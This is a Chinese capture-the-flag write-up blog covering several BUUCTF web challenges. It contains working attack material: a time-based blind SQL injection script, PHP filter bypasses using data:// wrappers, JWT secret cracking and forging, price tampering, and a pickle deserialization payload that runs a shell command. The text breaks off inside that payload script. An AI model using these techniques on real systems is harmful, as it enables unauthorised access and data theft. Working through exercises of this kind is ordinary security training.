<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666635456884-7f4f7eb4-f90b-46d4-97cf-3e06654519df.png#averageHue=%23161616&clientId=u2b89841e-5463-4&from=paste&height=66&id=u1ac813c6&name=image.png&originHeight=82&originWidth=1450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9781&status=done&style=none&taskId=u96d80542-783e-4ff4-aac3-f715c777d70&title=&width=1160" alt="image.png"><br>加密一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666635479183-ddc3da89-8c73-4124-a47a-cc431bffef4b.png#averageHue=%232f2e2d&clientId=u2b89841e-5463-4&from=paste&height=67&id=u610d83a9&name=image.png&originHeight=84&originWidth=1353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18850&status=done&style=none&taskId=u5418a3f0-1d13-4cfd-b610-c6b7a3b08d0&title=&width=1082.4" alt="image.png"><br>传入cookie里，然后就覆盖掉了config.secret_key，先访问login，再访问&#x2F;，让key就等于我们自定义的<code>hello</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666635545803-fb58cc4c-1ef0-424d-84cb-1464bcfb46a4.png#averageHue=%23f1f3f4&clientId=u2b89841e-5463-4&from=paste&height=538&id=ua6b9d70d&name=image.png&originHeight=673&originWidth=1700&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122083&status=done&style=none&taskId=u3c39a996-ad48-47f6-a49c-28b69dcbba4&title=&width=1360" alt="image.png"><br>已经登不上去了<br>之后用<code>flask-session-cookie-manager-master</code>伪造一个签名：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666635580733-53f85540-f350-4f9b-9996-df3a77cb4578.png#averageHue=%231b1b1b&clientId=u2b89841e-5463-4&from=paste&height=85&id=u07925ddd&name=image.png&originHeight=106&originWidth=1460&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15726&status=done&style=none&taskId=u083728a9-4039-40ee-a359-a52aed0e64b&title=&width=1168" alt="image.png"><br>给cookie装上：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666635600347-77d8c46b-92fa-4a21-9771-8f1fa9e8200c.png#averageHue=%23e1c38f&clientId=u2b89841e-5463-4&from=paste&height=551&id=udf68e0b1&name=image.png&originHeight=689&originWidth=1709&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84191&status=done&style=none&taskId=u4832020a-d329-46f5-a3b1-83a5ef0cb23&title=&width=1367.2" alt="image.png"><br>嗯哼？</p>
<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>考点：时间盲注，FUZZ<br>这题妥妥的脑瘫题，不会出可以不出好吗，是BUU复现的问题当我们说好吗，但是你他妈拉个b的ban个空格，这里能出bug我是没想到<br><code>if(2   &gt;1,1,0)</code>这里这么多空格你不检测到<br><code>&quot;stunum&quot;:f&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where</code>table_schema<code>=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.01),1)&quot;&#125;</code><br>他吗的这里多一个空格就检测到，你是什么物种啊？？？？<br>气得我不想说什么</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7d9cb5e2-3bda-47c6-92a8-ec8e0fda267f.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;stunum&quot;</span>:<span class="string">f&quot;if(ascii(substr((select(group_concat(flag,value))from`flag`),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.01),1)&quot;</span>&#125;</span><br><span class="line">        t1=time.time()</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="built_in">print</span>(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment">#&quot;stunum&quot;:f&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where`table_schema`=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.01),1)&quot;&#125;</span></span><br><span class="line"><span class="comment">#flag,score</span></span><br><span class="line"><span class="comment">#&quot;stunum&quot;:f&quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where`table_name`=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.01),1)&quot;&#125;</span></span><br><span class="line"><span class="comment">#flag,value</span></span><br></pre></td></tr></table></figure>

<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>这里还是学到了点东西的，不知道什么是JSFUCK编码，这一题刚好学习了一下<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e7246218f424">https://www.jianshu.com/p/e7246218f424</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684581180-3fa1c267-6c6f-4d5b-9616-b7d45bd2875d.png#averageHue=%23faf9f8&clientId=u6a1cf068-339c-4&from=paste&height=166&id=u2eb5aee6&name=image.png&originHeight=208&originWidth=1074&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16248&status=done&style=none&taskId=uae939770-69bf-4a0e-9d4d-5505f44813d&title=&width=859.2" alt="image.png"><br>查看源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684597731-c69ae4c7-5526-400d-bc41-0110ec79a785.png#averageHue=%23fdfcfc&clientId=u6a1cf068-339c-4&from=paste&height=207&id=ud5a4c298&name=image.png&originHeight=259&originWidth=1047&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10881&status=done&style=none&taskId=ub9ae9fde-efdf-4316-9bdd-138afe7c15d&title=&width=837.6" alt="image.png"><br>很简单，根据php的特写<code>.</code>会被转化为下划线，用<code>.</code>去绕过第一个判断<br>第二个判断是一个preg_match，由于没有用m识别符，所以识别不到%0a，最终payload为<br><code>?b.u.p.t=23333%0a</code><br>然后就进入了下一个页面：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684689446-80ac871f-51c8-4c5f-a12e-5f0d7f04edfa.png#averageHue=%23f9f8f7&clientId=u6a1cf068-339c-4&from=paste&height=224&id=u4ef8c28d&name=image.png&originHeight=280&originWidth=991&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27132&status=done&style=none&taskId=u88a51e15-4158-49b5-bdbd-c87f67e0e80&title=&width=792.8" alt="image.png"><br>访问：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684716186-3f632435-0ed8-44d2-b31b-fd6deab7e593.png#averageHue=%23efca85&clientId=u6a1cf068-339c-4&from=paste&height=177&id=u0004d97a&name=image.png&originHeight=221&originWidth=913&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13630&status=done&style=none&taskId=ua64c6640-fafb-4ab3-a8b5-fc70cf119e5&title=&width=730.4" alt="image.png"><br>查看源码就发现JSFUCK编码注释：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684737581-2d88f509-9443-4bb6-b31b-98e3576e416c.png#averageHue=%23fdfdfd&clientId=u6a1cf068-339c-4&from=paste&height=243&id=u126e5d43&name=image.png&originHeight=304&originWidth=1721&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34434&status=done&style=none&taskId=ubdd32fc2-dad8-405f-8edc-a7a095722bd&title=&width=1376.8" alt="image.png"><br>解码一下得到：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684761449-ffe2633f-f905-495a-96c9-2ad57a7f5cbf.png#averageHue=%23fcfbfb&clientId=u6a1cf068-339c-4&from=paste&height=45&id=ue90e62b4&name=image.png&originHeight=56&originWidth=398&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1830&status=done&style=none&taskId=u718b36e6-f8b2-47e5-834e-fd02261bda1&title=&width=318.4" alt="image.png"><br>叫我们post一下嘛：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684796999-dd71b3c1-e94a-4e25-b565-332edac9c8c8.png#averageHue=%23fefdfd&clientId=u6a1cf068-339c-4&from=paste&height=414&id=u2573ef2a&name=image.png&originHeight=517&originWidth=1438&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18497&status=done&style=none&taskId=u4a0060be-192f-4c99-ad98-61b34bb82c9&title=&width=1150.4" alt="image.png"><br>得到源码了嘛，审计之后发现需要伪造一个ip请求头，经过测试<code>Client-Ip</code>即可<br>然后，又有一个判断<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code><br>这边用data伪协议传参即可绕过<br>最后一个判断是对我们输入的file进行了一个加密，这边我们得逆向解密一下，写了个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:@Boogipop</span></span><br><span class="line">payload=<span class="string">&quot;flag.php&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">s</span>):</span><br><span class="line">    re=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        re+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i])-i*<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line">a=decode(payload)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>把输出的结果base64编码一下，得到最后结果：<br><code>?2333=data://text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684978578-548c0269-1931-45d6-8825-bf2901f59e5d.png#averageHue=%23c5c5c5&clientId=u6a1cf068-339c-4&from=paste&height=602&id=u11666423&name=image.png&originHeight=752&originWidth=1605&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40115&status=done&style=none&taskId=u24f70b41-66a6-4183-a858-d36d6363d32&title=&width=1284" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666684983429-e0983c5d-9589-4e1a-b695-257f0f7f016e.png#averageHue=%23f9f9f9&clientId=u6a1cf068-339c-4&from=paste&height=76&id=u4471d51f&name=image.png&originHeight=95&originWidth=885&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5408&status=done&style=none&taskId=ucb89251f-20da-4c4a-8c2c-20b4bd19c92&title=&width=708" alt="image.png"><br>结束啦！</p>
<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666794571821-98393b5c-f254-4425-b0d9-4457905a2ce4.png#averageHue=%23faf9f9&clientId=uc2a7974d-2551-4&from=paste&height=210&id=ue186f5a5&name=image.png&originHeight=262&originWidth=1205&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13734&status=done&style=none&taskId=u5cdcc1da-ff5e-478d-9ac7-2e3a106770d&title=&width=964" alt="image.png"><br>页面是一个guess页面，可以查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>flag在config.php里</p>
<ul>
<li>random_bytes:生成随机字符串</li>
</ul>
<p><code>random_bytes(5)</code>就是生成五位数的随机字符串，经常配合bin2hex使用，去生成一些密文</p>
<ul>
<li>hash_equals:意思和<code>===</code>一样</li>
<li>$_SERVER[‘PHP_SELF’]：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666795705530-8e0996b2-9632-445c-b37a-dfc0093cc760.png#averageHue=%239fc079&clientId=uc2a7974d-2551-4&from=paste&height=279&id=uc9837ec9&name=image.png&originHeight=349&originWidth=1414&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61401&status=done&style=none&taskId=u0c5c7b4f-cab8-4206-8152-81aa848679b&title=&width=1131.2" alt="image.png"><br><code>http://www.baidu.com/index.php/a/b?c=1</code>:获得的是<code>/index.php/a/b</code>，再加上basename得到的结果就是<code>b</code>,后面传递的参数是忽略的</p>
<ul>
<li>basename：返回路径里最后的一个部分，很好理解</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666795960629-d427d0c2-d7b5-4d52-a407-e32e89878a9c.png#averageHue=%23f8f7f7&clientId=uc2a7974d-2551-4&from=paste&height=494&id=uca9fff8e&name=image.png&originHeight=617&originWidth=1237&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49189&status=done&style=none&taskId=udc1f2c63-a231-4e44-95f6-f75085cf1e6&title=&width=989.6" alt="image.png"><br>这道题的入口也在这里，首先想要破解一个128位的强比较是完全不可能的，所以只有可能去绕过正则匹配了</p>
<p>这边经过本地测试，用以下脚本测试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;/test/test/&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="variable">$new_path</span>=<span class="variable">$path</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$new_path</span>)==<span class="string">&#x27;test&#x27;</span>)	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$new_path</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写这个脚本你可以发现结果：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666797111998-59e95ca2-c7a0-4cf6-813c-c95d7d41d467.png#averageHue=%23fcfcfc&clientId=uc2a7974d-2551-4&from=paste&height=653&id=u755daae7&name=image.png&originHeight=816&originWidth=859&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23319&status=done&style=none&taskId=u73f70211-1741-423f-8484-2ba9c44ca82&title=&width=687.2" alt="image.png"><br>这边在128后就是一些非数字字母字符，这种字符basename是无法识别出来的，所以可以用这个绕过，随便用一个字符<br><code>index.php/config.php/�?source</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666797235437-a461c292-7d6c-4a15-bba7-1a4efde278a2.png#averageHue=%23dfc083&clientId=uc2a7974d-2551-4&from=paste&height=82&id=uebb93842&name=image.png&originHeight=102&originWidth=929&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9157&status=done&style=none&taskId=u8c21bf8c-4436-4677-a55d-ae745ba4fde&title=&width=743.2" alt="image.png"><br>solved！</p>
<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>考点：JWT,代码审计，python(pickle反序列化）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839168892-4cb7d132-2d01-42a2-b1d6-7c094512fd5c.png#averageHue=%23e1e0e0&clientId=u88b30c86-53aa-4&from=paste&height=606&id=u054a9d80&name=image.png&originHeight=757&originWidth=1842&originalType=binary&ratio=1&rotation=0&showTitle=false&size=183708&status=done&style=none&taskId=uefd498ef-3264-48ac-b911-abc0e0c617c&title=&width=1473.6" alt="image.png"><br>这边进入之后是一个购买界面：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839199276-223b0073-380a-4f2e-96a3-a67523edaf63.png#averageHue=%23d4d4d4&clientId=u88b30c86-53aa-4&from=paste&height=537&id=u8e7279f4&name=image.png&originHeight=671&originWidth=1768&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75690&status=done&style=none&taskId=u7130e4c8-3949-4d7e-be2d-3fd0f43b382&title=&width=1414.4" alt="image.png"><br>意思是要我们买到lv6的账号，但是我翻了一圈发现没有，写了个脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://02733054-c1a3-46f7-818d-9cfaaf70e26f.node4.buuoj.cn:81/shop&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;page&quot;</span>:i</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.get(url=url,params=data)</span><br><span class="line">    <span class="comment"># print(r.text) #调试用</span></span><br><span class="line">    <span class="comment"># print(r.status_code)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;find!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">999</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;nope&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后是发现在<code>page=181</code>有lv6：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839263987-091318c4-d614-4246-b451-784ddea898e6.png#averageHue=%23d9d9d9&clientId=u88b30c86-53aa-4&from=paste&height=662&id=u40c8d2ec&name=image.png&originHeight=828&originWidth=1673&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87188&status=done&style=none&taskId=udccddfc3-fda9-4383-895e-d220694dda4&title=&width=1338.4" alt="image.png"><br>然后在这个购买界面就有个小漏洞，你买个普通账号然后抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839361311-328706ad-2d12-48fa-b957-902c35614919.png#averageHue=%23f8f4f4&clientId=u88b30c86-53aa-4&from=paste&height=126&id=u974397fa&name=image.png&originHeight=157&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20882&status=done&style=none&taskId=u474a8fa7-8344-43fd-bc9f-c3b50c1d046&title=&width=807.2" alt="image.png"><br>你改折扣会发现可以购买成功，所以可以花几毛钱买一个普通账号<br>但是我们对lv6这个账号进行这种操作就会：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839394149-03abdb5d-b03d-4fa1-9236-615a39453ca5.png#averageHue=%23f7f5f5&clientId=u88b30c86-53aa-4&from=paste&height=334&id=ue01eeff8&name=image.png&originHeight=418&originWidth=1120&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59818&status=done&style=none&taskId=ued6ee675-f553-48e0-8af2-3e29d447882&title=&width=896" alt="image.png"><br>这边就会重定向到一个界面，我们访问一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839431025-036d75e2-18a4-4586-bb7c-c720d02c84a4.png#averageHue=%23fefefe&clientId=u88b30c86-53aa-4&from=paste&height=373&id=u912b37da&name=image.png&originHeight=466&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12129&status=done&style=none&taskId=u488cb6ff-22b8-4acd-addf-805d20a4904&title=&width=667.2" alt="image.png"><br>会发现该界面只允许管理员访问，然后看看cookie：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839447596-49253eee-5a11-414c-9d55-0e12defe6462.png#averageHue=%23eeefef&clientId=u88b30c86-53aa-4&from=paste&height=37&id=u1bf9ff91&name=image.png&originHeight=46&originWidth=1669&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8722&status=done&style=none&taskId=u1459075a-98b5-409e-acb3-e19bd4c349f&title=&width=1335.2" alt="image.png"><br>有一个jwt，这边用c-jwt-cracker撞开jwt：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839523383-6d6e3e39-3809-48fb-82a4-ae3d84c8111e.png#averageHue=%23272931&clientId=u88b30c86-53aa-4&from=paste&height=78&id=ue046fa35&name=image.png&originHeight=97&originWidth=670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32343&status=done&style=none&taskId=ud9b84523-10ed-4ff6-ab32-6bd1856cd39&title=&width=536" alt="image.png"><br>这个是用来找key的，发现是iKun，我们去重新生成一个jwt：<br><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839559466-2fe48690-f3fd-46a0-8316-d6ac7c32852c.png#averageHue=%23fdfcfc&clientId=u88b30c86-53aa-4&from=paste&height=506&id=ub5e9c967&name=image.png&originHeight=632&originWidth=1518&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59378&status=done&style=none&taskId=ufa81f27d-da44-4858-8075-97ddd03f2b8&title=&width=1214.4" alt="image.png"><br>用这个jwt登录<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839577298-8c183238-30de-466a-befb-2fffb4dc6b5a.png#averageHue=%23fbfbfb&clientId=u88b30c86-53aa-4&from=paste&height=462&id=u08534327&name=image.png&originHeight=578&originWidth=1145&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26266&status=done&style=none&taskId=ud4d01bb1-d401-4d24-8e26-9b6708b27bb&title=&width=916" alt="image.png"><br>访问源代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839590008-eb715c51-e608-4363-a2ec-4a71262ec3c9.png#averageHue=%23fcfbfb&clientId=u88b30c86-53aa-4&from=paste&height=82&id=uf0306d7e&name=image.png&originHeight=102&originWidth=1118&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9856&status=done&style=none&taskId=ub0323ceb-0a59-40c0-b353-e53880ecf9e&title=&width=894.4" alt="image.png"><br>有网站的备份源码<br>这边代码审计一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666839640500-4ec78601-a29a-440d-8aed-3001670d0785.png#averageHue=%236c734d&clientId=u88b30c86-53aa-4&from=paste&height=165&id=u59e509cc&name=image.png&originHeight=206&originWidth=1643&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51378&status=done&style=none&taskId=u7af6494d-03bd-41d4-901a-0fc51a58d09&title=&width=1314.4" alt="image.png"><br>在admin函数里发现了一个pickle.loads反序列化，那这样就好办了<br>我们生成一个：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;</span>,))</span><br><span class="line">        <span class="comment"># return (os.system,(&#x27;ls&#x27;,))</span></span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span 